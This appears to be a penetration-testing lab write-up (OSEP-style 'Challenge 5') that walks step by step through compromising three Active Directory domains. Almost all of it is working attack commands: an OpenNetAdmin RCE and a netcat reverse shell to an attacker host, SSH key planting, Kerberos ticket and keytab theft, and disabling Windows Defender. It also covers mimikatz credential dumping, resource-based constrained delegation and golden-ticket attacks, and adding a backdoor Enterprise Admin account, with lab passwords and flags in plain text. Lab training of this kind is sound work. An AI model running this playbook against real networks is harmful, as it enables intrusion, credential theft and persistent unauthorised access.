# Challenge 5

## Enumeration

### External Hosts

#### **192.168.72.164**

**192.168.72.169**

### **Internal Hosts**

#### 172.16.72.160

#### 172.16.72.165

#### 172.16.72.166

#### 172.16.72.167

#### 172.16.72.168

## Compromise complyedge.com domain

### Initial Access to web05 (192.168.100.164)

```bash
# Exploit OpenNetAdmin 18.1.1 - Remote Code Execution
cd ona-rce
python3 ona-rce.py exploit http://192.168.100.164
# Execute reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.100 443 >/tmp/f
```

### Privilege Escalation on web05 (192.168.100.164)

```bash
sudo find . -exec /bin/sh \; -quit
```

### Post Exploitation on web05 (192.168.100.164)

{% code overflow="wrap" %}
```bash
# Change to ssh directory for pete domain user
cd /home/pete@complyedge.com/.ssh/
# Add public key to authorized keys file
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYU7cbck9dVt4TqiUWftp+wDvN0/Xoi85L9BV+nkodZA+SCQcjjGcuWxWfuVwCyHKdyeIX8AfLKXvB1QyMGQedgcakZmsUxfoFA99bT5ww36bQKVTk+Rg3bAOlkh2TrO9bmNfpzAZM2UduEXOYyxrKYlauAyj33ei9NHDS9tZ0+WEuSMPhkJ638kd/JMRNxIa4YdQ47rMKVmxgnFZUXxITF18od/MWuKfDnyK8qkoghV/iQkPQafLmzVFOOPyzMq/2uXl/zo62NQndNR0ay212pC7+csJC9xJuEOwRNku19beCF9E1Urh2y8IVdxIaaz8KocC/b97HxzAlFXfDdOnTEUqIttmXlnuxgnKjxeIumLAjzeYpviKxRAPZhvN7gBLcfS7FYSiIoGmJM5CIveCAuqIJXYXswCBMgw+CiuymDe41hL2JjTqJplVeS6lYBnUtt/QSnVaI2hxxkNGIsDYFs9dvslwJKRi4J/4/ELXkDkk/RtbClAmPBCsIUhfp9H8= kali@kali' > authorized_keys
# Change to root directory
cd /root
# Create root ssh key
ssh-keygen
# Change to root .ssh directory
cd .ssh
# Create root authorized keys file
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYU7cbck9dVt4TqiUWftp+wDvN0/Xoi85L9BV+nkodZA+SCQcjjGcuWxWfuVwCyHKdyeIX8AfLKXvB1QyMGQedgcakZmsUxfoFA99bT5ww36bQKVTk+Rg3bAOlkh2TrO9bmNfpzAZM2UduEXOYyxrKYlauAyj33ei9NHDS9tZ0+WEuSMPhkJ638kd/JMRNxIa4YdQ47rMKVmxgnFZUXxITF18od/MWuKfDnyK8qkoghV/iQkPQafLmzVFOOPyzMq/2uXl/zo62NQndNR0ay212pC7+csJC9xJuEOwRNku19beCF9E1Urh2y8IVdxIaaz8KocC/b97HxzAlFXfDdOnTEUqIttmXlnuxgnKjxeIumLAjzeYpviKxRAPZhvN7gBLcfS7FYSiIoGmJM5CIveCAuqIJXYXswCBMgw+CiuymDe41hL2JjTqJplVeS6lYBnUtt/QSnVaI2hxxkNGIsDYFs9dvslwJKRi4J/4/ELXkDkk/RtbClAmPBCsIUhfp9H8= kali@kali' > authorized_keys
# ssh as pete
ssh pete@complyedge.com@192.168.100.164
# List tmp folder to find file name of kerberos TGT
ls -al /tmp
# Download TGT for Pete
scp pete@complyedge.com@192.168.100.164:/tmp/krb5cc_75401103_jT6uMx .
# Import TGT
export KRB5CCNAME=/home/kali/Challenge5/krb5cc_75401103_jT6uMx
# Copy keytab file
scp root@192.168.100.164:/etc/krb5.keytab .
# Extract hashes from keytab file
python3 /home/kali/data/OSEP/Challenge5/keytabextract.py krb5.keytab
```
{% endcode %}

### Setup Port Forward

{% code overflow="wrap" %}
```bash
# Setup port forward on web05
sshuttle -v -e "ssh -i /home/kali/.ssh/id_rsa" -r root@192.168.100.164 172.16.100.0/24
```
{% endcode %}

### Active Directory Enumeration

{% code overflow="wrap" %}
```bash
# Domain User enumeration
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 172.16.100.168 complyedge.com/pete
```
{% endcode %}

### dmzdc01 (Domain Controller) compromise

{% code overflow="wrap" %}
```bash
# PSEXEC to DC
python3 /usr/share/doc/python3-impacket/examples/psexec.py complyedge.com/pete@dmzdc01.complyedge.com -k -no-pass
```
{% endcode %}

### dmzdc01 (Domain Controller) post exploitation

<pre class="language-bash"><code class="lang-bash"># Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Map network drive to kali host
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
# Change to mapped drive
x:
# Make temp directory on C:\
mkdir C:\temp
# Copy files locally
copy OSEP\ActiveDirectoryExploitation\mimikatz.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\mimidrv.sys C:\temp\
copy OSEP\ActiveDirectoryExploitation\adPEAS.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\PowerView.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\SharpHound.exe C:\temp\
<strong># Change back to C:
</strong>c:
cd \temp
# Run adPEAS
powershell
gc -raw .\adPEAS.ps1 | iex
Invoke-adPEAS
# Run SharpHound across all found domains
SharpHound.exe -c all -d ops.comply.com
SharpHound.exe -c all -d complyedge.com
SharpHound.exe -c all -d comply.com
# Copy sharphound files back to host for enumeration
copy *.zip x:\OSEP\
# Run mimikatz
mimikatz.exe
# Elevate token
token::elevate
# Dump hashes
lsadump::lsa /patch
# Dump secrets
lsadump::secrets
</code></pre>

## Compromise ops.comply domain

### Enumerate file06

{% code overflow="wrap" %}
```bash
# Connect to server
python3 /usr/share/doc/python3-impacket/examples/psexec.py complyedge.com/jim@172.16.100.166 -hashes :e48c13cefd8f9456d79cd49651c134e8
# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Map network drive to kali host
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
# Change to mapped drive
x:
# Make temp directory on C:\
mkdir C:\temp
# Copy files locally
copy OSEP\ActiveDirectoryExploitation\mimikatz.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\mimidrv.sys C:\temp\
copy OSEP\ActiveDirectoryExploitation\adPEAS.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\PowerView.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\SharpHound.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\Powermad.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\Rubeus.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\PsExec64.exe C:\temp\
# Change back to C:
c:
cd \temp
# Run adPEAS
powershell
gc -raw .\adPEAS.ps1 | iex
Invoke-adPEAS
# Run mimikatz
mimikatz.exe
# Elevate token
token::elevate
# Dump hashes
lsadump::lsa /patch
# Dump secrets
lsadump::secrets
```
{% endcode %}

### Compromise administrator@ops.comply.com

The computer FILE06.OPS.COMPLY.COM has generic write access to the computer JUMP09.OPS.COMPLY.COM. Generic write to a computer object can be used to perform a resource based constrained delegation attack.

#### Enumeration

{% code overflow="wrap" %}
```powershell
# Enumerate access rights for the user
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
# Check that you can create computer objects
Get-DomainObject -Identity ops.comply.com -Properties ms-DS-MachineAccountQuota
```
{% endcode %}

#### Exploitation

{% code overflow="wrap" %}
```powershell
# Create computer account with Powermad
. .\powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer
# Create a new SecurityDescriptor
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
# Convert the SecurityDescriptor to a byte array
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
# Set msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer -Identity jump09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
# Verify the SID in the SecurityDescriptor
$RBCDbytes = Get-DomainComputer jump09 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
ConvertFrom-SID S-1-5-21-2032401531-514583578-4118054891-6101
# Calculate NTLM hash with Rubeus
.\Rubeus.exe hash /password:h4x
# Use S4U extension to request a TGS for jump09
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/jump09.ops.comply.com /ptt
# List the service ticket to CIFS on APPSRV01
klist
# Verify CIFS access on jump09
dir \\jump09.ops.comply.com\c$
# Get proof.txt
type \\jump09.ops.comply.com\C$\Users\Administrator\Desktop\proof.txt
6fb02bb067bbc59b59747b82396bc2b3
# Request administrator ticket
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn CIFS/jump09.ops.comply.com -impersonate 'administrator' -ts ops.comply.com/myComputer\$:'h4x' -dc-ip 172.16.100.165
# Export the ticket
export KRB5CCNAME=/home/kali/Challenge5/administrator.ccache
# Use ticket to get remote shell with psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass administrator@jump09.ops.comply.com
```
{% endcode %}

#### Enumerate jump09

```powershell
# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Map network drive to kali host
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
# Change to mapped drive
x:
# Make temp directory on C:\
mkdir C:\temp
# Copy files locally
copy OSEP\ActiveDirectoryExploitation\mimikatz.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\mimidrv.sys C:\temp\
copy OSEP\ActiveDirectoryExploitation\adPEAS.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\PowerView.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\SharpHound.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\Powermad.ps1 C:\temp\
copy OSEP\ActiveDirectoryExploitation\Rubeus.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\PsExec64.exe C:\temp\
# Change back to C:
c:
cd \temp
# Run mimikatz
mimikatz.exe
# Elevate token
token::elevate
# Dump hashes
lsadump::lsa /patch
# Dump secrets
sekurlsa::logonpasswords
# Found domain admin credentials pete / 0998ASDaas2
```

#### Connecting to domain controller

```powershell
evil-winrm -u ops.comply.com\\pete -p '0998ASDaas2' -i 172.16.100.165
cd ..\..\administrator\desktop
type proof.txt
f3701e72dd29694e2927c7e5a237bcb8
```

## Compromise comply.com domain

{% code overflow="wrap" %}
```powershell
# Connect to domain controller
python3 /usr/share/doc/python3-impacket/examples/psexec.py ops.comply.com/pete@172.16.100.165
# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Map network drive to kali host
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
# Change to mapped drive
x:
# Make temp directory on C:\
mkdir C:\temp
# Copy files locally
copy OSEP\ActiveDirectoryExploitation\mimikatz.exe C:\temp\
copy OSEP\ActiveDirectoryExploitation\mimidrv.sys C:\temp\
copy X:\OSEP\ActiveDirectoryExploitation\PowerView.ps1 C:\temp\
copy X:\OSEP\ActiveDirectoryExploitation\PsExec64.exe C:\temp\
# Change back to C:
c:
cd \temp
# Run mimikatz
mimikatz.exe
# Obtain krbtgt hash with DCSync
lsadump::lsa /inject /name:krbtgt
# Find domain SIDs
Get-DomainSID -Domain ops.comply.com
Get-DomainSid -Domain comply.com
# Craft a golden ticket with ExtraSid (sids: value is destination domain SID appended with '-519' )
kerberos::golden /user:Administrator /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt
# Confirm ticket works
dir \\rdc02.comply.com\c$
# Get code execution on RDC01
Enter-PSSession -ComputerName rdc02.comply.com
# Verify Enterprise Admin group membership
whoami /groups
# Add a new user to connect with
net user haxor h@x0r123! /add /domain
# Add new user to the Enterprise Admins group
net group "Enterprise Admins" haxor /add /domain
# Connect with newly created user account
python3 /usr/share/doc/python3-impacket/examples/psexec.py comply.com/haxor@172.16.100.160
# Get proof
cd C:\Users\Administrator\Desktop
type proof.txt
6585a60dde320e81a456f7b4c7a8ad0b
```
{% endcode %}

## Get Final flag from .254

{% code overflow="wrap" %}
```powershell
python3 /usr/share/doc/python3-impacket/examples/psexec.py ops.comply.com/pete@172.16.100.254
# Get proof
cd C:\Users\Administrator\Desktop
type proof.txt
e30a02642986afda51fe430cf20c601f
```
{% endcode %}
